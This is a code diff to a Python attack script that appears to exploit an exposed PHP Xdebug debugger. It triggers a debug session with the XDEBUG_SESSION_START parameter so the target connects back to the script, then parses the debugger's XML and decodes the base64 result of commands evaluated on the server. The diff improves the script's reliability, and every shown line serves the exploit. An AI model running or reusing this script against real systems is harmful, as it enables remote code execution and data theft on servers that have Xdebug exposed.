@@ -5,6 +5,7 @@ import requests
 import argparse
 import socket
 import base64
+import binascii
 from concurrent.futures import ThreadPoolExecutor
 
 
@@ -15,6 +16,7 @@ session.headers = {
 }
 
 def recv_xml(sock):
+    blocks = []
     data = b''
     while True:
         try:
@@ -24,23 +26,25 @@ def recv_xml(sock):
         if not data:
             break
 
-        eop = data.find(b'\x00')
-        length = data[:eop]
-        data = data[eop+1:]
+        while data:
+            eop = data.find(b'\x00')
+            if eop < 0:
+                break
+            blocks.append(data[:eop])
+            data = data[eop+1:]
 
-        eop = data.find(b'\x00')
-        if eop < 0:
-            continue
-
-        content = data[:eop]
-        break
+        if len(blocks) >= 4:
+            break
     
-    return content
+    return blocks[3]
 
 
 def trigger(url):
     time.sleep(2)
-    session.get(url + '?XDEBUG_SESSION_START=phpstorm')
+    try:
+        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
+    except:
+        pass
 
 
 if __name__ == '__main__':
@@ -62,10 +66,14 @@ if __name__ == '__main__':
 
     data = recv_xml(conn)
     print('[+] Recieve data: ' + data.decode())
-    g = re.search(rb'<\!\[CDATA\[([a-z0-9\./\+]+)\]>', data, re.I)
+    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
     if not g:
         print('[-] No result...')
         sys.exit(0)
 
     data = g.group(1)
-    print('[+] Result: ' + base64.b64decode(data).decode())
+
+    try:
+        print('[+] Result: ' + base64.b64decode(data).decode())
+    except binascii.Error:
+        print('[-] May be not string result...')
